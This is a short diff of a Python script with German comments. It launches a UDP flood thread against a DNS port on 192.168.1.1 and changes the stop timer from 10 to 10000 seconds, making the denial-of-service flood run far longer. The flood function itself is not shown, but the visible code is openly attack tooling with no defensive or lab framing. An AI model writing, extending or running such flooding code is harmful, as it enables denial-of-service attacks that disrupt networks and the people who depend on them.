@@ -81,8 +81,8 @@ try:
     flood_thread = threading.Thread(target=udp_flood, args=("192.168.1.1", 53, 128, "dns"))
     flood_thread.start()
 
-    # Stoppe den Flood nach 10 Sekunden
-    threading.Timer(10, stop_event.set).start()
+    # Stoppe den Flood nach 10000 Sekunden
+    threading.Timer(10000, stop_event.set).start()
     flood_thread.join()
 
     print(f"Anzahl gesendeter Pakete: {packet_counter}")
